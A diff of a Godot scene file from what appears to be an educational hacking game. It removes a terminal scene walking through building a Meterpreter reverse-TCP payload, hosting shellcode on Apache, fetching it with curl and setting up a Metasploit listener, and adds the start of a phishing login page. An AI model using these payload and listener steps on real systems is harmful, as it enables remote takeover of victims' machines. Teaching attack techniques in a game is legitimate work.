@@ -1,9 +1,9 @@
-[gd_scene load_steps=5 format=3 uid="uid://bh1bt6iln0lav"]
+[gd_scene load_steps=5 format=3 uid="uid://cbreuyxskm8gt"]
 
-[ext_resource type="Shader" uid="uid://cectl5tsuf1ys" path="res://EnvironmentShaders/silhouette_test.gdshader" id="2_218bc"]
-[ext_resource type="Script" uid="uid://8c20w85u1pnm" path="res://Scenes/gui/Fileless Malware/silhouette.gd" id="2_lg882"]
+[ext_resource type="Shader" uid="uid://cectl5tsuf1ys" path="res://EnvironmentShaders/silhouette_test.gdshader" id="1_7lyqh"]
+[ext_resource type="Script" uid="uid://8c20w85u1pnm" path="res://Scenes/gui/Fileless Malware/silhouette.gd" id="2_dussi"]
 
-[sub_resource type="FontFile" id="FontFile_s2o3d"]
+[sub_resource type="FontFile" id="FontFile_xw1ye"]
 subpixel_positioning = 0
 msdf_pixel_range = 14
 msdf_size = 128
@@ -223,19 +223,28 @@ cache/0/18/0/underline_position = 0.0
 cache/0/18/0/underline_thickness = 0.0
 cache/0/18/0/scale = 1.0
 
-[sub_resource type="ShaderMaterial" id="ShaderMaterial_neoti"]
-shader = ExtResource("2_218bc")
+[sub_resource type="ShaderMaterial" id="ShaderMaterial_tc5ac"]
+shader = ExtResource("1_7lyqh")
 shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
 shader_parameter/hole_position = Vector2(0.015, 0.31)
 shader_parameter/hole_size = Vector2(2.05, 0.33)
 
-[node name="FilelessTerminal" type="Control"]
+[node name="PhishingAttack" type="Control"]
 layout_mode = 3
 anchors_preset = 15
 anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
+
+[node name="Background" type="ColorRect" parent="."]
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
+color = Color(0.39637, 0.465726, 0.669098, 1)
 
 [node name="Header" type="ColorRect" parent="."]
 layout_mode = 1
@@ -244,23 +253,24 @@ anchor_right = 1.0
 anchor_bottom = 0.074
 offset_bottom = 0.0480003
 grow_horizontal = 2
-color = Color(0.241156, 0.241156, 0.241156, 1)
+scale = Vector2(1.00035, 0.980913)
+color = Color(0.239216, 0.239216, 0.239216, 1)
 
 [node name="Button" type="Button" parent="."]
 layout_mode = 1
 anchors_preset = -1
-anchor_left = 0.766
+anchor_left = 0.891
 anchor_top = 0.014
-anchor_right = 0.811
+anchor_right = 0.935
 anchor_bottom = 0.062
-offset_left = 0.567993
+offset_left = -0.432007
 offset_top = -0.0720005
-offset_right = -0.272034
+offset_right = -0.120117
 offset_bottom = -0.176003
 grow_horizontal = 2
 text = "Run"
 
-[node name="malware" type="Label" parent="."]
+[node name="Title" type="Label" parent="."]
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.461
@@ -272,9 +282,9 @@ offset_top = -0.312001
 offset_right = -4.42804
 offset_bottom = -1.936
 grow_horizontal = 2
-theme_override_fonts/font = SubResource("FontFile_s2o3d")
+theme_override_fonts/font = SubResource("FontFile_xw1ye")
 theme_override_font_sizes/font_size = 18
-text = "root@cali"
+text = "VSCode"
 
 [node name="Body" type="ColorRect" parent="."]
 layout_mode = 1
@@ -283,31 +293,32 @@ anchor_top = 0.074
 anchor_right = 1.0
 anchor_bottom = 1.0
 offset_left = 22.0
-offset_top = 0.0480003
+offset_top = 43.048
 grow_horizontal = 2
 grow_vertical = 0
-color = Color(0.102971, 0.0952661, 0.0829469, 1)
+color = Color(0.239216, 0.239216, 0.239216, 1)
 
 [node name="Sidebar" type="ColorRect" parent="."]
 layout_mode = 1
 anchors_preset = -1
 anchor_right = 0.019
 anchor_bottom = 1.0
-offset_top = 48.0
-offset_right = 0.112
+offset_top = 91.0
+offset_right = 0.112001
 grow_vertical = 2
-color = Color(0.0475577, 0.0475576, 0.0475576, 1)
+color = Color(0.239216, 0.239216, 0.239216, 1)
 
 [node name="Linenumbers" type="Label" parent="."]
 layout_mode = 1
 anchors_preset = -1
-anchor_top = 0.077
+anchor_left = 0.002
+anchor_top = 0.136
 anchor_right = 0.018
 anchor_bottom = 0.998
-offset_left = 2.0
-offset_top = 0.103996
-offset_right = 0.263998
-offset_bottom = 2.29596
+offset_left = -0.304
+offset_top = -0.128006
+offset_right = 5.264
+offset_bottom = 472.296
 theme_override_constants/line_spacing = -5
 text = " 1
  2
@@ -340,276 +351,95 @@ text = " 1
 29
 30
 31
-32
-33"
+ "
 autowrap_mode = 1
 
-[node name="Sourcecode_Apache" type="Label" parent="."]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.022
-anchor_top = 0.076
-anchor_right = 0.497
-anchor_bottom = 0.722
-offset_left = -0.344002
-offset_top = -0.248005
-offset_right = 190.456
-offset_bottom = -215.856
-theme_override_constants/line_spacing = -5
-text = "root@cali :~ # sudo cp shellcode.txt /var/www/html/
-root@calir :~ # sudo service apache2 start
-root@cali :~ # curl http://192.168.x.x/shellcode.txt
-unsigned char buf[] = \"
-\\x33\\xc9\\x83\\xee\\x9a\\x7e\\xe8\\xff\\xff\\xff\\xfc\\xc0\\x5e\\x81\\x76
-\\x0e\\xeb\\x73\\x82\\x43\\x83\\xee\\xfc\\x2e\\x4f\\x41\\x17\\x9b\\x0d\\x43
-\\xeb\\x73\\x82\\x72\\x39\\xfa\\x67\\x27\\x60\\x21\\xbc\\x8c\\xb9\\x0d\\x43
-\\x09\\x11\\xff\\xf8\\xf0\\x6b\\xda\\x8c\\xd4\\x41\\x55\\x3b\\x03\\x47\\x41
-\\xfe\\x39\\x35\\xee\\x9a\\x7e\\x82\\x43\\x82\\x24\\x7f\\xa4\\x03\\xbc\\xf3
-\\xbc\\x11\\xbc\\xff\\x0d\\x53\\x60\\x31\\xbe\\x43\\xbc\\xff\\xc3\\xfc\\x3b
-\\x6e\\xb3\\x6f\\x0f\\xea\\xa3\\x0b\\x2b\\x1f\\xf3\\xda\\x3a\\xea\\xa0\\x47
-\\x2b\\x2b\\x40\\x40\\x47\\x72\\x45\\x7b\\x0b\\x60\\x76\\x40\\x91\\x46\\x03
-\\xbb\\x9a\\xf6\\x06\\x62\\x12\\x0c\\x2b\\x47\\x64\\x27\\x45\\x2a\\x3a\\x0b
-\\xeb\\x73\\x82\\x4c\\x47\\x41\\xc3\\xbc\\xfd\\x0f\\xda\\x12\\xca\\x44\\x57
-\\xea\\xf3\\x7d\\x0b\\xd9\\x9a\\x5e\\x27\\x91\\x62\\x09\\x44\\x47\\x52\\xca
-root@cali:- # clear"
-
-[node name="Explanation Part1" type="Label" parent="Sourcecode_Apache"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "Now we need to host the payload shellcode so the computer can download it.
-
-This line copies the shellcode.txt file (your payload in C array format) into Apache’s public HTML folder.
-
-"
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part2" type="Label" parent="Sourcecode_Apache"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "This line starts the Apache web server so the file can be served over HTTP.
-
-
-
-"
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part3" type="Label" parent="Sourcecode_Apache"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "Requests the file via HTTP from your Apache server’s IP address.
-
-If it outputs the full unsigned char buf[] = ... shellcode, then the hosting is working.
-
-"
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part4" type="Label" parent="Sourcecode_Apache"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "Look like it's working"
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part5" type="Label" parent="Sourcecode_Apache"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "Now run CLEAR and let's setup the listener in Metasploit"
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Sourcecode_Msfvenom" type="Label" parent="."]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.022
-anchor_top = 0.076
-anchor_right = 0.497
-anchor_bottom = 0.722
-offset_left = -0.344002
-offset_top = -0.248005
-offset_right = 190.456
-offset_bottom = -377.856
-theme_override_constants/line_spacing = -5
-text = "root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
-<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
---arch x86 -f c -o shellcode.txt
-
-[-] No platform was selected, choosing Msf::Module::Platform::Windows 
-from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 333 bytes
-Saved as: shellcode.txt
-root@cali:- # clear"
-
-[node name="Explanation Part1" type="Label" parent="Sourcecode_Msfvenom"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 309.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "This command is asking Metasploit’s payload maker (msfvenom) to create a special program for Windows that will secretly call back to my computer’s IP and port. I’m telling it my IP (LHOST) and the port number (LPORT) so it knows where to connect. I’m also saying it’s for Windows (--platform windows), it should work on 32-bit processors (--arch x86), and the output should look like C programming code (-f c). Finally, I want it saved in a file called shellcode.txt so I can use it later."
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part2" type="Label" parent="Sourcecode_Msfvenom"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 101.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = " You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part3" type="Label" parent="Sourcecode_Msfvenom"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 75.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "You didn’t type --arch x86, but your chosen payload works on 32-bit (x86) systems, so msfvenom picked that for you."
-autowrap_mode = 3
-justification_flags = 162
-
-[node name="Explanation Part4" type="Label" parent="Sourcecode_Msfvenom"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.521
-anchor_top = 0.088
-anchor_right = 0.966
-anchor_bottom = 0.164
-offset_left = 190.502
-offset_top = -9.864
-offset_right = 190.862
-offset_bottom = 23.708
-theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
-text = "Payload created, now let's host it in apache. CLEAR the terminal"
-autowrap_mode = 3
-justification_flags = 162
-
 [node name="Silhouette" type="ColorRect" parent="."]
-material = SubResource("ShaderMaterial_neoti")
+visible = false
+material = SubResource("ShaderMaterial_tc5ac")
 layout_mode = 1
 anchors_preset = 15
 anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-script = ExtResource("2_lg882")
+script = ExtResource("2_dussi")
 
-[node name="Sourcecode_Metasploit" type="Label" parent="."]
-visible = false
+[node name="File1Header" type="ColorRect" parent="."]
+layout_mode = 1
+anchors_preset = -1
+anchor_top = 0.074
+anchor_right = 1.0
+anchor_bottom = 0.142
+offset_top = 0.0480003
+offset_right = -962.0
+offset_bottom = -1.01601
+grow_horizontal = 2
+color = Color(0.239216, 0.239216, 0.239216, 1)
+
+[node name="FileName1" type="Label" parent="File1Header"]
+layout_mode = 1
+anchors_preset = -1
+anchor_left = 0.168
+anchor_top = 0.163
+anchor_right = 0.789
+anchor_bottom = 0.744
+offset_left = 0.079998
+offset_top = -0.00899839
+offset_right = 0.0899963
+offset_bottom = 0.00799942
+grow_horizontal = 2
+theme_override_fonts/font = SubResource("FontFile_xw1ye")
+theme_override_font_sizes/font_size = 18
+text = "Website.cpp
+"
+
+[node name="Sourcecode_PhishingSite" type="Label" parent="."]
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.022
 anchor_top = 0.076
 anchor_right = 0.497
 anchor_bottom = 0.722
-offset_left = -0.344002
-offset_top = -0.248005
-offset_right = 190.456
-offset_bottom = -215.856
+offset_left = 3.656
+offset_top = 36.752
+offset_right = 194.456
+offset_bottom = 37.144
 theme_override_constants/line_spacing = -5
-text = "msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse
-_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
-LHOST => 192.168.56.102
-msf6 exploit(multi/handler) >  set LPORT 8000
-LPORT => 8000
-msf6 exploit(multi/handler) > show options
+text = "<!DOCTYPE html>
+<html lang=\"en\">
+<head>
+    <meta charset=\"UTF-8\">
+    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        "
 
-Module options (exploit/multi/handler)
-
-          Name         Current Setting      Required       Description
-
-Payload options (windows/meterpreter/reverse_tcp)
-
-          Name         Current Setting      Required       Description
-
-          EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
-                                                                                 seh, thr, ead, process, none)
-          LHOST       192.168.29.208         yes         The listen address (an 
-                                                                                 interface maybe specified)
-          LPORT       8000                           yes         The listen port "
-
-[node name="Explanation Part1" type="Label" parent="Sourcecode_Metasploit"]
+[node name="Explanation Part1" type="Label" parent="Sourcecode_PhishingSite"]
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.521
@@ -631,7 +461,7 @@ Perfect for catching a reverse_tcp payload you made with msfvenom.
 autowrap_mode = 3
 justification_flags = 162
 
-[node name="Explanation Part2" type="Label" parent="Sourcecode_Metasploit"]
+[node name="Explanation Part2" type="Label" parent="Sourcecode_PhishingSite"]
 visible = false
 layout_mode = 1
 anchors_preset = -1
@@ -650,7 +480,7 @@ If the payload you made in msfvenom is windows/meterpreter/reverse_tcp, this mus
 autowrap_mode = 3
 justification_flags = 162
 
-[node name="Explanation Part3" type="Label" parent="Sourcecode_Metasploit"]
+[node name="Explanation Part3" type="Label" parent="Sourcecode_PhishingSite"]
 visible = false
 layout_mode = 1
 anchors_preset = -1
@@ -669,7 +499,7 @@ Must match the LHOST you used in msfvenom."
 autowrap_mode = 3
 justification_flags = 162
 
-[node name="Explanation Part4" type="Label" parent="Sourcecode_Metasploit"]
+[node name="Explanation Part4" type="Label" parent="Sourcecode_PhishingSite"]
 visible = false
 layout_mode = 1
 anchors_preset = -1
@@ -686,7 +516,7 @@ text = "Same as above — this needs to match the LPORT from your generated payl
 autowrap_mode = 3
 justification_flags = 162
 
-[node name="Explanation Part5" type="Label" parent="Sourcecode_Metasploit"]
+[node name="Explanation Part5" type="Label" parent="Sourcecode_PhishingSite"]
 visible = false
 layout_mode = 1
 anchors_preset = -1
@@ -705,6 +535,6 @@ You’ve set LHOST and LPORT, and EXITFUNC has a default (process), so you’re 
 
 Let's now create the boilerplate
 
-Let's close the terminal and open "
+Let's close the terminal and open VSCode"
 autowrap_mode = 3
 justification_flags = 162
